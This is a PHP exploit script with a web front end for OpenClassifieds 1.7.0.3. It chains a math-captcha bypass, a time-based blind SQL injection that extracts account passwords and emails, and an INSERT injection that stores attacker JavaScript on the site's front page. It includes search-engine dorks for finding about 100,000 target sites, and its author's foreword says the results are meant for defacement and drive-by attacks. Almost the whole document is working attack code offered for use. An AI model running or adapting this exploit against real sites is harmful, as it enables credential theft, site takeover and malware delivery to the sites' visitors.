Author:Michael Brooks (Rook)<br>
Application:OpenClassifieds 1.7.0.3<br>
download: http://open-classifieds.com/download/<br>
Exploit chain:captcha bypass->sqli(insert)->persistant xss on front page<br>
If registration is required an extra link in the chain is added:<br>
Exploit chain:blind sqli(select)->captcha
bypass->sqli(insert)->persistant xss on front page<br>
sites with SEO url's enabled:<br>
"powerd by Open Classifieds" inurl:"publish-a-new-ad.htm"  (85,000 results)<br>
or default urls:<br>
"powerd by Open Classifieds"  inurl:"item-new.php" (16,500 results)<br>
Total sites: ~100,000<br>
<br>
<br>
The target must be a link to the document root of OpenClassifieds<br>
(If the exploit doesn't immediately reload then blind sqli is
required,  which will take a few minutes  ;)<br>
<form>
	Target:  <input size=128 name=target value="http://localhost/"><br>
	Payload:<input size=128 name=xss value="<script>alert('xss')</script>"><br>
	<input type=submit value="Attack">
</form><br>
<?php
/*
 Foreword:
 I have always wanted to write a chained exploit with a captcha
bypass,  so I couldn't miss this
 opportunity.    I spent a bit more effort on this exploit even though
there aren't very many hits (around
 100k starts to be worth while). Regardless, I dug into the
application and pulled out the vulnerabilities
 needed to Finnish my masterpiece.  Usually when I write a Remote Code
Execution exploit for a web
 app you guys just deface the site or throw up drive-by attacks.  So I
figured, persistent XSS on the
 front page is equally as valuable,  especially with yet another IE
0-day in the wild.  The chain is within
 the application its self.  Process sand-boxing like
chroot/AppArmor/SELinux/Application-V(MS)
 doesn't come into play.  It works regardless of the operating system
or configurations (Suhosin,
 safemode, magic_quotes_gpc and register_globals doesn't come into
play). I focused on the
 application's internal configurations that could break the
exploitation process.  In this case seo friendly
 urls and requiring an account before posting.

 "This web application [OpenClassifieds] is developed to be fast,
light, secure and SEO friendly."
 Usually when I see that an application claims to be secure,  they
really don't know what the fuck they
 are doing.  OpenClassifieds' Security model is deeply flawed and as a
result there are MANY
 vulnerabilities in this code base which allowed me to string a few
cool ones together to make an
 interesting exploit.    OpenClassifieds is sanitizing everything on
input using cG() and cP(),  these
 functions are used to perform a mysql_real_escape_string()  on all
GET and POST variables.  Most
 servers aren't using an exotic character set so from a security stand
point this is exactly identical to
 magic_quotes_gpc.  So I dusted off my usual magic_quotes_gpc auditing
tricks,  look for
 stripslashes(),base64decode(),urldecode(),html_entity_decode() lack
of quote marks around variables
 in a query,  ect...  Sanitation must ALWAYS be done at the time of
use, parametrized queries are a
 good example of this.   Its impossible to account for all the ways a
variable can be mangled once it
 enters a program and if you Sanitize input when it first enters the
program there will be cases where it
 will become dangerous again.   This isn't only a problem for SQLi,
its also a problem for XSS.  I am
 inserting JS into the database, which isn't a vulnerablity,  but
printing it, is persistant XSS.

 The blind sql injection is a bit strange.  I can't use white space or
commas,  which is a pain.  I had to
 rewrite my general purpose Blind SQLi Class to accommodate.   A
binary search is used to greatly
 speed up the blind sqli attack.
 (which I also used in my php-nuke exploit:
http://www.exploit-db.com/exploits/12510/)

 Special thanks to Reiners for this sqli filter evasion cheat sheet:
 http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
 Here are some changes I had to make to my blind sql injection class:
 "select substring('abc',1,1)"=>"select substring('abc' from 1 for 1)"
 if(greatest(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)"
=>"case ".sprintf($question,"0+".$cur).">".$pos." when true  then
sleep(".$this->timeout.") end"

 CWE Violations leveraged by this exploit:
 CWE-256: Plaintext Storage of a Password
 CWE-804: Guessable CAPTCHA  (I asked that they create this CWE when I
ran into a guy that works for Mitre.)
 CWE-89: SQL Injection x2
 CWE-79: Cross-site Scripting (Persistant)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Vulnerable captcha:
openclassifieds/includes/common.php line 291
function encode_str ($input){//converts the input into Ascii HTML, to
ofuscate a bit
    for ($i = 0; $i < strlen($input); $i++) {
         $output .= "&#".ord($input[$i]).';';
    }
    //$output = htmlspecialchars($output);//uncomment to escape sepecial chars
    return $output;
}
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function mathCaptcha(){//generates a captcha for the form
	$first_number=mt_rand(1, 94);//first operation number
	$second_number=mt_rand(1, 5);//second operation number

	$_SESSION["mathCaptcha"]=($first_number+$second_number);//operation result

	$operation=" <b>".encode_str($first_number ." + ".
$second_number)."</b>?";//operation codifieds

	echo _("How much is")." ".$operation;
}
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Vulnerable persistant xss and sqli
/content/item-new.php line 41
$ocdb->insert(TABLE_PREFIX."posts
(idCategory,type,title,description,price,idLocation,place,name,email,phone,password,ip,hasImages)","".
												cP("category").",".cP("type").",'$title','$desc',$price,$location,'".cP("place")."','".cP("name")."','$email','".cP("phone")."','$post_password','$client_ip',$hasImages");
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
*/
set_time_limit(0);
error_reporting(0);

function main(){
	if($_REQUEST['target'] && $_REQUEST['xss']){
		if(xssFrontPage($_REQUEST['target'],$_REQUEST['xss'])){
			print("<b>Persistant XSS attack was sucessful.</b>");
		}else{
			print("<b>Persistant XSS attack has failed.</b>");
		}
	}
}

//w00t, I can crack your captcha with 4 lines of code!
//It would have been 3 if i had used eval(),  but that would be a
vulnerability ;)
function breakCaptcha($page){
	preg_match("/\<b\>(.*)\<\/b\>\?/",$page,$match);
	$code=html_entity_decode($match[1]);
	$math=new EvalMath();
	return $math->evaluate($code);
}

function xssFrontPage($url,$xss){
	$h=new http_client();
	$page=$h->send($url."/content/item-new.php");
	#Authentication required.
	if(strstr($page,'Location: http')){#Do we need authentication?
		print "Blind SQL Injection required.<br>";
		$sex=new openclassifieds_blind_sql_injection($url."/");
		if($sex->test_target()){
			print "Target is vulnerable to attack!<br>";
			$pass=$sex->find_string("password");
			print "Found Password:<b>$pass</b><br>";
			$email=$sex->find_string("email");
			print "Found email:<b>$email</b><br>";
			$h->postdata="email=$email&password=$pass&submit=loading...";
			$h->send($url."/content/account/login.php");
			$h->postdata='';
			$page=$h->send($url."/");
		}else{
			die("This target is not exploitable!<br>");
		}	
	}else{
		$email="test@test.com";
	}
	$code=breakCaptcha($page);
	$payload=blind_sql_injection::charEncode($xss);
	$pwd=mt_rand(1,9999999);//Strong password :p
	$fake_phone=mt_rand(1111111111,9999999999);
	$fake_email=blind_sql_injection::charEncode(mt_rand()."@".mt_rand().".com");
	$fake_ip=blind_sql_injection::charEncode(mt_rand(20,254).".".mt_rand(20,254).".".mt_rand(20,254).".".mt_rand(20,254));
	//Stored xss in the description,place and name columns.
	$inj="36,".mt_rand(1,20).",".$payload.",".mt_rand().",".mt_rand(2,500).",".mt_rand(1,10).",".mt_rand().",".mt_rand().",".$fake_email.",".$fake_phone.",".$pwd.",".$fake_ip.",0)#";
        $h->postdata="category=".$inj."&type=0&place=home&title=title&price=1&description=desc&name=name&email=".$email."&math=".$code;
	$h->send($url."/content/item-new.php");
	$h->postdata='';
	//I could use sql injection to find the id,  but thats noisy and slow.
	$rss=$h->send($url."/content/feed-rss.php");
	//seo friendly
	if(preg_match("/\-(.*)\.htm\<\/link\>/",$rss,$match)){
		$guess=$match[1];
	}else if(preg_match("/item\=(.*)\&type/",$rss,$match)){
		$guess=$match[1];
	}else{
		$guess=0;
	}
	$guess++;
	$page='';
	$test=false;
	#Now lets activate the XSS post.
	for($x=$guess;$x-$guess<=128&&!$test;$x++){
		$page=$h->send($url."/content/item-manage.php?pwd=".$pwd."&post=".$x."&action=confirm");
		$test=strstr($page,"<script language='JavaScript'
type='text/javascript'>alert('");
	}
	return $test;
}

//http://localhost/openclassifieds/?location=%26%23039;/**/or/**/sleep(10)/**/or/**/1=%26%23039;
//The blind_sql_injeciton calss is a general exploit framework that we
are inheriting.
class openclassifieds_blind_sql_injection extends blind_sql_injection {
    //This is the blind sql injection request.
    function query($check){
        //build the http request to Inject a query:
	//"%26%23039;" is a single quote encoded with
urlencode(htmlencode("'",ENT_QUOTES));
	$payload="%26%23039; or (select ".$check." from oc_accounts where
active=1 limit 1) or 1=%26%23039;";
	#white space becomes and underscore "_" so it must be replaced.
	$payload=str_replace(" ","/**/",$payload);
	$this->set_get("location=".$payload);
    }
}

//This is a very efficient blind sql injection class.
class blind_sql_injection{
    var $url, $backup_url, $result, $http, $request_count, $timeout;
    function blind_sql_injection($url,$timeout=10){
        $this->request_count=0;
        $this->url=$url;
        $this->backup_url=$url;
        $this->http=new http_client();
        $this->timeout=$timeout;
    }
    function set_get($get){
        $this->url=$this->url."?".$get;
    }
    function set_referer($referer){
        $this->http->referer=$referer;
    }
    function set_post($post){
        $this->http->postdata=$post;
    }
    function test_target(){
        return $this->send("case true when true then
sleep(".$this->timeout.") when false then sleep(0)
end")&&!$this->send("case false when true then
sleep(".$this->timeout.") when false then sleep(0) end");
	#return $this->send("if(true,sleep(".$this->timeout."),0)")&&!$this->send("if(false,sleep(".$this->timeout."),0)");
    }
    function num_to_hex($arr){
        $ret='';
        foreach($arr as $a){
            if($a<=9){
                $ret.=$a;
            }else{
                $ret.=chr(87+$a);
            }
        }
        return $ret;
    }
    ###These where not ported to the non-comma version.
    //Looking for a string of length 32 and base 16 in ascii chars.
    #function find_md5($column){
     #   return
$this->num_to_hex($this->bin_finder(16,32,"conv(substring($column,%s,1),16,10)"));
    #}
    #function find_sha1($column){
     #   return
$this->num_to_hex($this->bin_finder(16,40,"conv(substring($column,%s,1),16,10)"));
    #}
    //Look for an ascii string of arbitrary length.
    function find_string($column){
        $ret='';
        //A length of zero means we are looking for a null byte
terminated string.
        $result=$this->bin_finder(128,0,"ascii(substring($column from
%s for 1))");
        foreach($result as $r){
            $ret.=chr($r);
        }
        return strrev($ret);
    }
    //query() is a method that generates the sql injection request
    function query($check){
        //This function must be overridden.
    }
    function recheck($result,$question,$base){
       $this->bin_finder($base,1,$question,$start);
       //Force a long timeout.
       $tmp_timeout=$this->timeout;
       if($this->timeout<10){
          $this->timeout=10;
       }else{
          $this->timeout=$this->timeout*2;
       }
       $l=1;
       foreach($result as $r){
          if($this->send("if(".sprintf($question,$l)."!=".$r.",sleep(".$this->timeout."),0)")){
              $result[]=$b;
              break;
          }
          $l++;
       }
       $this->timeout=$tmp_timeout;
    }
    function linear_finder($base,$length,$question){
        for($l=1;$l<=$length;$l++){
            for($b=0;$b<$base;$b++){

if($this->send("if(".sprintf($question,$l)."=".$b.",sleep(".$this->timeout."),0)")){
                    $result[]=$b;
                    break;
                }
            }
        }
    }
    #Binary search for mysql based sql injection.
    function bin_finder($base,$length,$question){
        $start_pos=1;
        $result='';
        for($cur=$start_pos;$cur<=$length||$length==0;$cur++){
            $n=$base-1;
            $low=0;
            $floor=$low;
            $high=$n-1;
            $pos= $low+(($high-$low)/2);
            $found=false;
            while($low<=$high&&!$found){
                #asking the sql database if the current value is
greater than $pos
                if($this->send("case
".sprintf($question,"0+".$cur).">".$pos." when true  then
sleep(".$this->timeout.") end")){
		#if($this->send("if(greatest(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)")){
                    #if this is true then the value must be the modulus.
                    if($pos==$n-1){
                       $result[]=$pos+1;
                       $found=true;
                    }else{
                        $low=$pos+1;
                    }
                #asking the sql database if the current value is less than $pos
                }else if($this->send("case
".sprintf($question,"0+".$cur)."<".$pos." when true then
sleep(".$this->timeout.") end")){
		#}else if($this->send("if(least(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)")){
                   #if this is true the value must be zero, or in the
case of ascii,  a null byte.
                   if($pos==$floor+1){
                        $found=true;
                        #We have found the null terminator so we have
finnished our search for a string.
                        if($length==0){
                            $length=-1;
                        }else{
                            $result[]=$pos-1;
                        }
                    }else{
                        $high=$pos-1;
                    }
                }else{
                    #both greater than and less then where asked, so
so then the answer is our guess $pos.
                    $result[]=$pos;
                    $found=true;
                }
                $pos=$low+(($high-$low)/2);
            }
            print(".");
        }
        return $result;
    }
    //Fire off the request
    function send($quesiton){
        //build the injected query.
        $this->query($quesiton);
        $start=time();
        $resp=$this->http->send($this->url);
        //backup_url is for set_get()
        $this->url=$this->backup_url;
        $this->request_count++;
        return (time()-$start>=$this->timeout);
    }
    //retroGod RIP
   function charEncode($string){
	$char="char(";
	$size=strlen($string);
	for($x=0;$x<$size;$x++){
		$char.=ord($string[$x]).",";
	}
	$char[strlen($char)-1]=")%00";
	return $char;
   }
}

//General purpose http client that works on a default php install.
(curl not required)
class http_client{
    var $proxy_ip='', $proxy_port='', $proxy_name='', $proxy_pass='',
$referer='',$cookie='',$postdata='';
    function send($loc){
         //overload function polymorphism between gets and posts
         $url=parse_url($loc);
         if(!isset($url['port'])){
            $url['port']=80;
        }
         $ua='Firefox';
         if($this->proxy_ip!=''&&$this->proxy_port!=''){
            $fp = pfsockopen( $this->proxy_ip, $this->proxy_port,
&$errno, &$errstr, 120 );
            $url['path']=$url['host'].':'.$url['port'].$url['path'];
         }else{
            $fp = fsockopen( $url['host'], $url['port'], &$errno,
&$errstr, 120 );
         }
         if( !$fp ) {
            print "$errstr ($errno)<br>\nn";
            return false;
         } else {
	    if(@!$url['query']){
		$url['query']='';
	    }
            if( $this->postdata=='' ) {
                $request="GET ".$url['path']."?".$url['query']." HTTP/1.1\r\n";
            } else {
                $request="POST ".$url['path']."?".$url['query']." HTTP/1.1\r\n";
            }
            if($this->proxy_name!=''&&$this->proxy_pass!=''){
                $request.="Proxy-Authorization: Basic
".base64_encode($this->proxy_name.":".$this->proxy_pass)."\r\n\r\n";
            }
            $request.="Host: ".$url['host'].":".$url['port']."\r\n";
            $request.="User-Agent: ".$ua."\r\n";
            $request.="Accept: text/plain\r\n";
            if($this->referer!=''){
                $request.="Referer: ".$this->referer."\r\n";
            }
            $request.="Connection: Close\r\n";
            if($this->cookie!=''){
                $request.="Cookie: ".$this->cookie."\r\n" ;
            }
            if( $this->postdata!='' ) {
                $strlength = strlen( $this->postdata );
                $request.="Content-type:
application/x-www-form-urlencoded\r\n" ;
                $request.="Content-length: ".$strlength."\r\n\r\n";
                $request.=$this->postdata;
            }
            fputs( $fp, $request."\r\n\r\n" );
            $output='';
	    while( !feof( $fp ) ) {
                   $output .= fgets( $fp, 1024 );
	    }
            fclose( $fp );
	    $header=explode("\r\n\r\n",$output);
	    if(strstr($header[0],"Set-Cookie: ") && $this->cookie==''){
		$cookie=explode("Set-Cookie: ",$header[0]);
		$cookie=explode("\n",$cookie[1]);
		$cookie=explode(";",$cookie[0]);
		$this->cookie=trim($cookie[0]);
	    }
	    if(strstr($output,"Query:")){
		die($output);
	    }
	    return $output;
         }
    }
    //Use a http proxy
    function proxy($proxy){ //user:pass@ip:port
        $proxyAuth=explode('@',$proxy);
        if(isset($proxyAuth[1])){
            $login=explode(':',$proxyAuth[0]);
            $this->proxy_name=$login[0];
            $this->proxy_pass=$login[1];
            $addr=explode(':',$proxyAuth[1]);
        }else{
            $addr=explode(':',$proxy);
        }
         $this->proxy_ip=$addr[0];
        $this->proxy_port=$addr[1];
    }
    //Parses the results from a PHP error to use as a path disclosure.
    function getPath($url,$pops=1){
        $html=$this->send($url);
        //Regular error reporting:
        $resp=explode("array given in <b>",$html);
        if(isset($resp[1])){
            $resp = explode("</b>",$resp[1]);
        }else{
            //xdebug's error reporting:
            $resp=explode("array given in ",$html);
            if(isset($resp[1])){
                $resp = explode(" ",$resp[1]);
            }else{
                $resp[0]=false;
            }
        }
        $path=$resp[0];
        //Can't use dirname()
        if(strstr($path,"\\")){
           $p=explode("\\",$path);
           for($x=0;$x<$pops;$x++){
               array_pop($p);
           }
           $path=implode("\\",$p);
        }else{
           $p=explode("/",$path);
           for($x=0;$x<$pops;$x++){
               array_pop($p);
           }
           $path=implode("/",$p);
        }
        return $path;
    }
    //Grab the server type from the http header.
    function getServer($url){
        $resp=$this->send($url);
        $header=explode("Server: ",$resp);
        $server=explode("\n",$header[1]);
        return $server[0];
    }
}

#used to evaluate the captcha. 1+2=3
 class EvalMath {

                var $suppress_errors = false;
                var $last_error = null;

                var $v = array('e'=>2.71,'pi'=>3.14); // variables
(and constants)
                var $f = array(); // user-defined functions
                var $vb = array('e', 'pi'); // constants
                var $fb = array(  // built-in functions
                        'sin','sinh','arcsin','asin','arcsinh','asinh',
                        'cos','cosh','arccos','acos','arccosh','acosh',
                        'tan','tanh','arctan','atan','arctanh','atanh',
                        'sqrt','abs','ln','log');

                function EvalMath() {
                        // make the variables a little more accurate
                        $this->v['pi'] = pi();
                        $this->v['e'] = exp(1);
                }

                function e($expr) {
                        return $this->evaluate($expr);
                }

                function evaluate($expr) {
                        $this->last_error = null;
                        $expr = trim($expr);
                        if (substr($expr, -1, 1) == ';') $expr =
substr($expr, 0, strlen($expr)-1); // strip semicolons at the end
                        //===============
                        // is it a variable assignment?
                        if (preg_match('/^\s*([a-z]\w*)\s*=\s*(.+)$/',
$expr, $matches)) {
                                if (in_array($matches[1], $this->vb))
{ // make sure we're not assigning to a constant
                                        return $this->trigger("cannot
assign to constant '$matches[1]'");
                                }
                                if (($tmp =
$this->pfx($this->nfx($matches[2]))) === false) return false; // get
the result and make sure it's good
                                $this->v[$matches[1]] = $tmp; // if
so, stick it in the variable array
                                return $this->v[$matches[1]]; // and
return the resulting value
                        //===============
                        // is it a function assignment?
                        } elseif
(preg_match('/^\s*([a-z]\w*)\s*\(\s*([a-z]\w*(?:\s*,\s*[a-z]\w*)*)\s*\)\s*=\s*(.+)$/',
$expr, $matches)) {
                                $fnn = $matches[1]; // get the function name
                                if (in_array($matches[1], $this->fb))
{ // make sure it isn't built in
                                        return $this->trigger("cannot
redefine built-in function '$matches[1]()'");
                                }
                                $args = explode(",",
preg_replace("/\s+/", "", $matches[2])); // get the arguments
                                if (($stack = $this->nfx($matches[3]))
=== false) return false; // see if it can be converted to postfix
                                for ($i = 0; $i<count($stack); $i++) {
// freeze the state of the non-argument variables
                                        $token = $stack[$i];
                                        if (preg_match('/^[a-z]\w*$/',
$token) and !in_array($token, $args)) {
                                                if
(array_key_exists($token, $this->v)) {
                                                        $stack[$i] =
$this->v[$token];
                                                } else {
                                                        return
$this->trigger("undefined variable '$token' in function definition");
                                                }
                                        }
                                }
                                $this->f[$fnn] = array('args'=>$args,
'func'=>$stack);
                                return true;
                        //===============
                        } else {
                                return $this->pfx($this->nfx($expr));
// straight up evaluation, woo
                        }
                }

                function vars() {
                        $output = $this->v;
                        unset($output['pi']);
                        unset($output['e']);
                        return $output;
                }

                function funcs() {
                        $output = array();
                        foreach ($this->f as $fnn=>$dat)
                                $output[] = $fnn . '(' . implode(',',
$dat['args']) . ')';
                        return $output;
                }

                //===================== HERE BE INTERNAL METHODS
====================\\

                // Convert infix to postfix notation
                function nfx($expr) {

                        $index = 0;
                        $stack = new EvalMathStack;
                        $output = array(); // postfix form of
expression, to be passed to pfx()
                        $expr = trim(strtolower($expr));

                        $ops   = array('+', '-', '*', '/', '^', '_');
                        $ops_r =
array('+'=>0,'-'=>0,'*'=>0,'/'=>0,'^'=>1); // right-associative
operator?
                        $ops_p =
array('+'=>0,'-'=>0,'*'=>1,'/'=>1,'_'=>1,'^'=>2); // operator
precedence

                        $expecting_op = false; // we use this in
syntax-checking the expression
                                                                   //
and determining when a - is a negation

                        if (preg_match("/[^\w\s+*^\/()\.,-]/", $expr,
$matches)) { // make sure the characters are all good
                                return $this->trigger("illegal
character '{$matches[0]}'");
                        }

                        while(1) { // 1 Infinite Loop ;)
                                $op = substr($expr, $index, 1); // get
the first character at the current index
                                // find out if we're currently at the
beginning of a number/variable/function/parenthesis/operand
                                $ex =
preg_match('/^([a-z]\w*\(?|\d+(?:\.\d*)?|\.\d+|\()/', substr($expr,
$index), $match);
                                //===============
                                if ($op == '-' and !$expecting_op) {
// is it a negation instead of a minus?
                                        $stack->push('_'); // put a
negation on the stack
                                        $index++;
                                } elseif ($op == '_') { // we have to
explicitly deny this, because it's legal on the stack
                                        return $this->trigger("illegal
character '_'"); // but not in the input expression
                                //===============
                                } elseif ((in_array($op, $ops) or $ex)
and $expecting_op) { // are we putting an operator on the stack?
                                        if ($ex) { // are we expecting
an operator but have a number/variable/function/opening parethesis?
                                                $op = '*'; $index--;
// it's an implicit multiplication
                                        }
                                        // heart of the algorithm:
                                        while($stack->count > 0 and
($o2 = $stack->last()) and in_array($o2, $ops) and ($ops_r[$op] ?
$ops_p[$op] < $ops_p[$o2] : $ops_p[$op] <= $ops_p[$o2])) {
                                                $output[] =
$stack->pop(); // pop stuff off the stack into the output
                                        }
                                        // many thanks:
http://en.wikipedia.org/wiki/Reverse_Polish_notation#The_algorithm_in_detail
                                        $stack->push($op); // finally
put OUR operator onto the stack
                                        $index++;
                                        $expecting_op = false;
                                //===============
                                } elseif ($op == ')' and
$expecting_op) { // ready to close a parenthesis?
                                        while (($o2 = $stack->pop())
!= '(') { // pop off the stack back to the last (
                                                if (is_null($o2))
return $this->trigger("unexpected ')'");
                                                else $output[] = $o2;
                                        }
                                        if
(preg_match("/^([a-z]\w*)\($/", $stack->last(2), $matches)) { // did
we just close a function?
                                                $fnn = $matches[1]; //
get the function name
                                                $arg_count =
$stack->pop(); // see how many arguments there were (cleverly stored
on the stack, thank you)
                                                $output[] =
$stack->pop(); // pop the function and push onto the output
                                                if (in_array($fnn,
$this->fb)) { // check the argument count
                                                        if($arg_count > 1)
                                                                return
$this->trigger("too many arguments ($arg_count given, 1 expected)");
                                                } elseif
(array_key_exists($fnn, $this->f)) {
                                                        if ($arg_count
!= count($this->f[$fnn]['args']))
                                                                return
$this->trigger("wrong number of arguments ($arg_count given, " .
count($this->f[$fnn]['args']) . " expected)");
                                                } else { // did we
somehow push a non-function on the stack? this should never happen
                                                        return
$this->trigger("internal error");
                                                }
                                        }
                                        $index++;
                                //===============
                                } elseif ($op == ',' and
$expecting_op) { // did we just finish a function argument?
                                        while (($o2 = $stack->pop()) != '(') {
                                                if (is_null($o2))
return $this->trigger("unexpected ','"); // oops, never had a (
                                                else $output[] = $o2;
// pop the argument expression stuff and push onto the output
                                        }
                                        // make sure there was a function
                                        if
(!preg_match("/^([a-z]\w*)\($/", $stack->last(2), $matches))
                                                return
$this->trigger("unexpected ','");
                                        $stack->push($stack->pop()+1);
// increment the argument count
                                        $stack->push('('); // put the
( back on, we'll need to pop back to it again
                                        $index++;
                                        $expecting_op = false;
                                //===============
                                } elseif ($op == '(' and !$expecting_op) {
                                        $stack->push('('); // that was easy
                                        $index++;
                                        $allow_neg = true;
                                //===============
                                } elseif ($ex and !$expecting_op) { //
do we now have a function/variable/number?
                                        $expecting_op = true;
                                        $val = $match[1];
                                        if
(preg_match("/^([a-z]\w*)\($/", $val, $matches)) { // may be func, or
variable w/ implicit multiplication against parentheses...
                                                if
(in_array($matches[1], $this->fb) or array_key_exists($matches[1],
$this->f)) { // it's a func
                                                        $stack->push($val);
                                                        $stack->push(1);
                                                        $stack->push('(');
                                                        $expecting_op = false;
                                                } else { // it's a var
w/ implicit multiplication
                                                        $val = $matches[1];
                                                        $output[] = $val;
                                                }
                                        } else { // it's a plain old var or num
                                                $output[] = $val;
                                        }
                                        $index += strlen($val);
                                //===============
                                } elseif ($op == ')') { //
miscellaneous error checking
                                        return $this->trigger("unexpected ')'");
                                } elseif (in_array($op, $ops) and
!$expecting_op) {
                                        return
$this->trigger("unexpected operator '$op'");
                                } else { // I don't even want to know
what you did to get here
                                        return $this->trigger("an
unexpected error occured");
                                }
                                if ($index == strlen($expr)) {
                                        if (in_array($op, $ops)) { //
did we end with an operator? bad.
                                                return
$this->trigger("operator '$op' lacks operand");
                                        } else {
                                                break;
                                        }
                                }
                                while (substr($expr, $index, 1) == '
') { // step the index past whitespace (pretty much turns whitespace
                                        $index++;
       // into implicit multiplication if no operator is there)
                                }

                        }
                        while (!is_null($op = $stack->pop())) { // pop
everything off the stack and push onto output
                                if ($op == '(') return
$this->trigger("expecting ')'"); // if there are (s on the stack, ()s
were unbalanced
                                $output[] = $op;
                        }
                        return $output;
                }

                // evaluate postfix notation
                function pfx($tokens, $vars = array()) {

                        if ($tokens == false) return false;

                        $stack = new EvalMathStack;

                        foreach ($tokens as $token) { // nice and easy
                                // if the token is a binary operator,
pop two values off the stack, do the operation, and push the result
back on
                                if (in_array($token, array('+', '-',
'*', '/', '^'))) {
                                        if (is_null($op2 =
$stack->pop())) return $this->trigger("internal error");
                                        if (is_null($op1 =
$stack->pop())) return $this->trigger("internal error");
                                        switch ($token) {
                                                case '+':

$stack->push($op1+$op2); break;
                                                case '-':

$stack->push($op1-$op2); break;
                                                case '*':

$stack->push($op1*$op2); break;
                                                case '/':
                                                        if ($op2 == 0)
return $this->trigger("division by zero");

$stack->push($op1/$op2); break;
                                                case '^':

$stack->push(pow($op1, $op2)); break;
                                        }
                                // if the token is a unary operator,
pop one value off the stack, do the operation, and push it back on
                                } elseif ($token == "_") {
                                        $stack->push(-1*$stack->pop());
                                // if the token is a function, pop
arguments off the stack, hand them to the function, and push the
result back on
                                } elseif
(preg_match("/^([a-z]\w*)\($/", $token, $matches)) { // it's a
function!
                                        $fnn = $matches[1];
                                        if (in_array($fnn, $this->fb))
{ // built-in function:
                                                if (is_null($op1 =
$stack->pop())) return $this->trigger("internal error");
                                                $fnn =
preg_replace("/^arc/", "a", $fnn); // for the 'arc' trig synonyms
                                                if ($fnn == 'ln') $fnn = 'log';
                                                eval('$stack->push(' .
$fnn . '($op1));'); // perfectly safe eval()
                                        } elseif
(array_key_exists($fnn, $this->f)) { // user function
                                                // get args
                                                $args = array();
                                                for ($i =
count($this->f[$fnn]['args'])-1; $i >= 0; $i--) {
                                                        if
(is_null($args[$this->f[$fnn]['args'][$i]] = $stack->pop())) return
$this->trigger("internal error");
                                                }

$stack->push($this->pfx($this->f[$fnn]['func'], $args)); // yay...
recursion!!!!
                                        }
                                // if the token is a number or
variable, push it on the stack
                                } else {
                                        if (is_numeric($token)) {
                                                $stack->push($token);
                                        } elseif
(array_key_exists($token, $this->v)) {
                                                $stack->push($this->v[$token]);
                                        } elseif
(array_key_exists($token, $vars)) {
                                                $stack->push($vars[$token]);
                                        } else {
                                                return
$this->trigger("undefined variable '$token'");
                                        }
                                }
                        }
                        // when we're out of tokens, the stack should
have a single element, the final result
                        if ($stack->count != 1) return
$this->trigger("internal error");
                        return $stack->pop();
                }

                // trigger an error, but nicely, if need be
                function trigger($msg) {
                        $this->last_error = $msg;
                        if (!$this->suppress_errors)
trigger_error($msg, E_USER_WARNING);
                        return false;
                }
        }

        // for internal use
        class EvalMathStack {

                var $stack = array();
                var $count = 0;

                function push($val) {
                        $this->stack[$this->count] = $val;
                        $this->count++;
                }

                function pop() {
                        if ($this->count > 0) {
                                $this->count--;
                                return $this->stack[$this->count];
                        }
                        return null;
                }

                function last($n=1) {
                        return $this->stack[$this->count-$n];
                }
        }
	
main();
?>
